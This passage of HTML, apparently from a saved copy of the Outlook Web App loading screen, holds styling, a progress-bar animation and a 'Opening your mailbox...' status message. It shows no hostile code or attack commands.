wa-color-cal-brown{color:#AB9B81}.owa-color-cal-green-alt{color:#A9C47A}.owa-color-cal-grey{color:#999B9C}.owa-color-cal-orange{color:#E6975C}.owa-color-cal-pink{color:#CA6AAB}.owa-color-cal-red{color:#D57272}.owa-color-cal-teal{color:#7BCBC4}.owa-color-cal-yellow{color:#E3B75D}.owa-color-folder-brown{color:#EAC282}.ms-font-color-red{color:#E81123}.ms-font-color-redDark{color:#A80000}
</style>
<script>
         var HeaderImageTemplate = ".o365cs-topnavBGImage{background:url('prem/16.1881.7.2370790/resources/themes/@theme/images/0/headerbgmaing2.png'),url('prem/16.1881.7.2370790/resources/themes/@theme/images/0/headerbgmaing2.gif');width:1px;height:1px}";
        </script>
<style id="HeaderImages">
</style>
<script>
        
        (function () {
            if ("-ms-user-select" in document.documentElement.style && navigator.userAgent.match(/IEMobile\/10\.0/)) {
                var msViewportStyle = document.createElement("style");
                msViewportStyle.appendChild(
                    document.createTextNode("@-ms-viewport{width:auto!important}")
                    );
                document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
            }
        })();
    </script>
<style>
        body
        {
            width: 100%;
            height: 100%;
            margin: 0;
            padding: 0;
        }
 
        #owaLoading
        {
            background-color: #FFF;
            width: 100%;
            height: 100%;
            position: absolute;
            z-index: 10001;
        }
        
        #loadingLogo, #loadingSpinner, #statusText
        {
            display: block;
            margin-left: auto;
            margin-right: auto;
            text-align: center;
        }
        
        #loadingLogo
        {
            padding-top: 174px;
            padding-bottom: 22px;
        }
        
        .tnarrow #loadingLogo
        {
            padding-top: 52px;
        }

        #statusText
        {
            color: #0072c6;
            font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
            font-size: 12px;
            margin-top: 20px;
        }

        #statusText > span
        {
            display: none;
            margin-left: auto;
            margin-right: auto;
            line-height: 11px;
        }

        #statusText.script > .script
        {
            display: inline;
        }

        #statusText.scriptDelay > .scriptDelay
        {
            display: inline;
        }

        #statusText.data > .data
        {
            display: inline;
        }

        #statusText.dataDelay > .dataDelay
        {
            display: inline;
        }

        #statusText.render > .render
        {
            display: inline;
        }
    
    </style>
</head>
<!--[if IE 8 ]> <body class="ie8 ms-fwt-r"> <![endif]-->
<!--[if (gte IE 9)|!(IE)]><!-->
<body class="notIE8 ms-fwt-r">
<!--<![endif]-->
<div id="owaLoading"> <img id="loadingLogo" alt="Outlook" src='outlook.live.com/SignIn_files/logo1.png'/>
  <style>
        .prog_bar_container {
            width: 300px;
            height: 5px;
            overflow: hidden;
            background-color: #cccccc;
            margin-left: auto;
            margin-right: auto;
            text-align: center;
        }
        .prog_bar_keyframer_data {
            width: 0%;
            max-width: 100%;
            height: 5px;
            overflow: hidden;
            position: relative;
            background-color: #0078d7;
            -webkit-animation: progmove 20s 1 forwards;
            -moz-animation: progmove 20s 1 forwards;
            -ms-animation: progmove 20s 1 forwards;
            -o-animation: progmove 20s 1 forwards;
            animation: progmove 20s 1 forwards;
            -webkit-animation-timing-function: linear;
            -moz-animation-timing-function: linear;
            -ms-animation-timing-function: linear;
            -o-animation-timing-function: linear;
            animation-timing-function: linear;
        }
        .prog_bar_keyframer_data div {
            position: absolute;
            width: 0;
            height: 0;
        }
        .prog_bar_keyframer_data .animation {
            -webkit-animation-duration: 1s;
            -moz-animation-duration: 1s;
            -ms-animation-duration: 1s;
            -o-animation-duration: 1s;
            animation-duration: 1s;
            -webkit-animation-timing-function: linear;
            -moz-animation-timing-function: linear;
            -ms-animation-timing-function: linear;
            -o-animation-timing-function: linear;
            animation-timing-function: linear;
            -webkit-animation-direction: normal;
            -moz-animation-direction: normal;
            -ms-animation-direction: normal;
            -o-animation-direction: normal;
            animation-direction: normal;
            -webkit-animation-iteration-count: infinite;
            -moz-animation-iteration-count: infinite;
            -ms-animation-iteration-count: infinite;
            -o-animation-iteration-count: infinite;
            animation-iteration-count: infinite;
            -webkit-animation-delay: 0.687s;
            -moz-animation-delay: 0.687s;
            -ms-animation-delay: 0.687s;
            -o-animation-delay: 0.687s;
            animation-delay: 0.687s;
        }
        .prog_bar_keyframer_data .texture {
            position: absolute;
            background: no-repeat;
            background-size: cover;
        }
        .prog_bar_keyframer_data .layer-1-anchor {
            left: -500px;
            top: -3px;
        }
        .prog_bar_keyframer_data .layer-1-translateX {
            -webkit-animation-name: prog_bar_keyframer_data-layer-1-translateX;
            -moz-animation-name: prog_bar_keyframer_data-layer-1-translateX;
            -ms-animation-name: prog_bar_keyframer_data-layer-1-translateX;
            -o-animation-name: prog_bar_keyframer_data-layer-1-translateX;
            animation-name: prog_bar_keyframer_data-layer-1-translateX;
        }
        @-webkit-keyframes prog_bar_keyframer_data-layer-1-translateX {
            0% {
                -webkit-transform: translateX(-50px);
                -webkit-animation-timing-function: cubic-bezier(0.85, 0, 0.64, 1);
            }
            98.36% {
                -webkit-transform: translateX(350px);
                -webkit-animation-timing-function: linear;
            }
            100% {
                -webkit-transform: translateX(350px);
            }
        }
        @-moz-keyframes prog_bar_keyframer_data-layer-1-translateX {
            0% {
                -moz-transform: translateX(-50px);
                -moz-animation-timing-function: cubic-bezier(0.85, 0, 0.64, 1);
            }
            98.36% {
                -moz-transform: translateX(350px);
                -moz-animation-timing-function: linear;
            }
            100% {
                -moz-transform: translateX(350px);
            }
        }
        @-ms-keyframes prog_bar_keyframer_data-layer-1-translateX {
            0% {
                -ms-transform: translateX(-50px);
                -ms-animation-timing-function: cubic-bezier(0.85, 0, 0.64, 1);
            }
            98.36% {
                -ms-transform: translateX(350px);
                -ms-animation-timing-function: linear;
            }
            100% {
                -ms-transform: translateX(350px);
            }
        }
        @-o-keyframes prog_bar_keyframer_data-layer-1-translateX {
            0% {
                -o-transform: translateX(-50px);
                -o-animation-timing-function: cubic-bezier(0.85, 0, 0.64, 1);
            }
            98.36% {
                -o-transform: translateX(350px);
                -o-animation-timing-function: linear;
            }
            100% {
                -o-transform: translateX(350px);
            }
        }
        @keyframes prog_bar_keyframer_data-layer-1-translateX {
            0% {
                transform: translateX(-50px);
                animation-timing-function: cubic-bezier(0.85, 0, 0.64, 1);
            }
            98.36% {
                transform: translateX(350px);
                animation-timing-function: linear;
            }
            100% {
                transform: translateX(350px);
            }
        }
        .prog_bar_keyframer_data .layer-1-content {
            width: 800px;
            height: 10px;
            opacity: 0.85;
            background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAyAAAAAKCAYAAABMrzqlAAAACXBIWXMAAAABAAAAAQE4IvRAAAAAJHpUWHRDcmVhdG9yAAAImXNMyU9KVXBMK0ktUnBNS0tNLikGAEF6Bs5qehXFAAAAxklEQVR4nO3bwQ3CIAAFUDBO4hyO4ZgeHcE5XEVPJg1V0lJaSvPexYAf8pv0IGkNAQAAAAAA4GjiWhvfn6+1toYQxvdubiwrKzsvu/d+VbO36+URANjMuXUBWChO+JyS6S3bS0/Z42d76ZnLOoAAbOjUugBQ5N26AABACQcQAABgMw4gACzhaRwAs/gPCL1Lf/x8x3Ewl77znc7/Gv/7bkpm6ZraPUvWlHQ4Qs+SNTWvbTje87Xl9mhxj9foCQAAAAAAAACFPsTMCankaacdAAAAAElFTkSuQmCC');
        }

        @-webkit-keyframes progmove { 
         from {}
         to { width: 95% }
        }

        @-moz-keyframes progmove { 
            from {}

            to { width: 95% }
        }

        @-ms-keyframes progmove { 
            from { }
            to { width: 95% }
        }

        @keyframes progmove { 
            from { }
            to { width: 95% }
        }
      </style>
  <div class="prog_bar_container">
    <div id="progressBar" class="prog_bar_keyframer_data">
      <div class="layer-1-translateX animation">
        <div class="layer-1-anchor">
          <div class="layer-1-content texture "></div>
        </div>
      </div>
    </div>
  </div>
  <script>
            pbar.startScriptLoad();
    </script>
  <div id = "statusText" class="script">
    <p>Opening your mailbox...</p>
  </div>
</div>
<div id='preloadDiv' style="visibility:hidden;height: 1px; margin-bottom: -1px; overflow: hidden;"> <span style='font-family:"wf_segoe-ui_light";'>t</span> <span style='font-family:"wf_segoe-ui_normal";'>t</span> <span style='font-family:"wf_segoe-ui_semibold";'>t</span> <span style='font-family:"wf_segoe-ui_semilight";'>t</span> <span style='font-family:"webfontPreload";'></span> <img src='../hotmail/prem/16.1881.7.2370790/resources/images/0/sprite1.mouse.png' alt=""/> </div>
</body>
</html>
